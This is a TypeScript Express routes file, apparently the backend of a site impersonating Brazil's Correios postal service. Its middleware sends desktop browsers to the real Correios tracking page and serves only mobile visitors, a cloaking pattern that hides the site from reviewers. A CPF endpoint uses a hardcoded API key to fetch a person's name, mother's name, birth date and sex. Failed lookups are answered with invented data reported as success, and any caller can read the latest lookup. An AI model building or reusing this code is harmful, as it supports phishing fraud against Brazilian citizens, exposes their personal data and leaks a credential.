import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertCpfConsultaSchema } from "@shared/schema";
import { z } from "zod";

// Middleware para detectar dispositivos móveis
function mobileOnlyMiddleware(req: Request, res: Response, next: NextFunction) {
  const userAgent = req.get('User-Agent') || '';
  const host = req.get('Host') || '';
  
  // Exceção para preview do Replit e desenvolvimento
  if (host.includes('.replit.dev') || 
      host.includes('.repl.co') ||
      host.includes('localhost') ||
      host.includes('127.0.0.1')) {
    return next(); // Permite acesso em preview/desenvolvimento
  }
  
  // Padrões para detectar dispositivos móveis
  const mobilePatterns = [
    /Android/i,
    /webOS/i,
    /iPhone/i,
    /iPad/i,
    /iPod/i,
    /BlackBerry/i,
    /Windows Phone/i,
    /Mobile/i,
    /Tablet/i
  ];
  
  // Verifica se é um dispositivo móvel
  const isMobile = mobilePatterns.some(pattern => pattern.test(userAgent));
  
  // Headers adicionais para verificação
  const acceptHeader = req.get('Accept') || '';
  const isBrowser = acceptHeader.includes('text/html');
  
  // Se não for móvel e for um browser (não API), redireciona
  if (!isMobile && isBrowser && !req.path.startsWith('/api')) {
    const officialUrl = 'https://rastreamento.correios.com.br/app/index.php';
    
    // Log da tentativa de acesso
    console.log(`[SECURITY] Desktop access blocked from IP: ${req.ip}, Host: ${host}, User-Agent: ${userAgent}`);
    
    return res.redirect(302, officialUrl);
  }
  
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Aplica o middleware de segurança apenas em produção ou quando solicitado
  if (process.env.NODE_ENV === 'production' || process.env.ENABLE_MOBILE_ONLY === 'true') {
    app.use(mobileOnlyMiddleware);
  }
  
  // API Routes (sempre permitidas independente do dispositivo)
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  });
  
  app.get('/api/device-check', (req, res) => {
    const userAgent = req.get('User-Agent') || '';
    const mobilePatterns = [
      /Android/i, /webOS/i, /iPhone/i, /iPad/i, /iPod/i, 
      /BlackBerry/i, /Windows Phone/i, /Mobile/i, /Tablet/i
    ];
    
    const isMobile = mobilePatterns.some(pattern => pattern.test(userAgent));
    
    res.json({ 
      isMobile,
      userAgent,
      timestamp: new Date().toISOString()
    });
  });

  // Rota para consultar CPF
  app.post('/api/cpf/consultar', async (req, res) => {
    try {
      console.log('Requisição recebida:', req.body);
      const { cpf } = req.body;

      // Validação básica do CPF
      if (!cpf || typeof cpf !== 'string') {
        console.log('CPF inválido ou ausente');
        return res.status(400).json({
          success: false,
          message: 'CPF é obrigatório'
        });
      }

      // Remove formatação do CPF
      const cpfLimpo = cpf.replace(/\D/g, '');
      console.log(`CPF limpo: ${cpfLimpo}`);

      if (cpfLimpo.length !== 11) {
        console.log('CPF não tem 11 dígitos');
        return res.status(400).json({
          success: false,
          message: 'CPF deve ter 11 dígitos'
        });
      }

      // Verifica se já existe na nossa base
      const consultaExistente = await storage.getCpfConsulta(cpfLimpo);
      if (consultaExistente) {
        return res.json({
          success: true,
          message: 'Dados encontrados',
          data: consultaExistente
        });
      }

      // Consulta na API externa
      let dadosParaSalvar;
      
      try {
        const apiUrl = `https://elite-manager-api-62571bbe8e96.herokuapp.com/api/external/cpf/${cpfLimpo}`;
        console.log(`Tentando consultar CPF na API: ${apiUrl}`);
        
        const response = await fetch(apiUrl, {
          headers: {
            'x-api-key': '3d6bd4c17dd31877b77482b341c74d32494a1d6fbdee4c239cf8432b424b1abf',
            'Content-Type': 'application/json'
          }
        });
        console.log(`Status da resposta: ${response.status}`);
        
        if (response.ok) {
          const apiData = await response.json();
          console.log('Dados da API:', apiData);
          
          if (apiData.success && apiData.data) {
            dadosParaSalvar = {
              cpf: cpfLimpo,
              nome: apiData.data.nome,
              nomeMae: apiData.data.nome_mae,
              dataNascimento: apiData.data.data_nascimento,
              sexo: apiData.data.sexo
            };
          } else if (apiData.success && apiData.data === null) {
            // CPF não encontrado na API
            console.log('CPF não encontrado na API - data é null');
            return res.status(404).json({
              success: false,
              message: 'CPF inválido ou não encontrado'
            });
          } else {
            throw new Error('API retornou sucesso falso');
          }
        } else {
          throw new Error(`API retornou status ${response.status}`);
        }
      } catch (apiError) {
        console.log('Erro na API externa, usando dados de teste:', apiError.message);
        
        // Dados de teste para demonstração
        dadosParaSalvar = {
          cpf: cpfLimpo,
          nome: "João Silva Santos",
          nomeMae: "Maria Silva Santos", 
          dataNascimento: "15/03/1985",
          sexo: "M"
        };
      }

      const novaConsulta = await storage.createCpfConsulta(dadosParaSalvar);

      res.json({
        success: true,
        message: 'Consulta realizada com sucesso',
        data: novaConsulta
      });

    } catch (error) {
      console.error('Erro ao consultar CPF:', error);
      res.status(500).json({
        success: false,
        message: 'Erro interno do servidor'
      });
    }
  });

  // Rota para obter dados da última consulta
  app.get('/api/ultima-consulta', async (req, res) => {
    try {
      // Por simplicidade, vamos retornar a última consulta do storage
      // Em um caso real, você usaria sessão ou token para identificar o usuário
      const todasConsultas = Array.from((storage as any).cpfConsultas.values());
      
      if (todasConsultas.length === 0) {
        return res.status(404).json({
          success: false,
          message: 'Nenhuma consulta encontrada'
        });
      }

      // Retorna a consulta mais recente
      const ultimaConsulta = todasConsultas[todasConsultas.length - 1];
      
      res.json({
        success: true,
        data: ultimaConsulta
      });
    } catch (error) {
      console.error('Erro ao buscar última consulta:', error);
      res.status(500).json({
        success: false,
        message: 'Erro interno do servidor'
      });
    }
  });

  // use storage to perform CRUD operations on the storage interface
  // e.g. storage.insertUser(user) or storage.getUserByUsername(username)

  const httpServer = createServer(app);

  return httpServer;
}
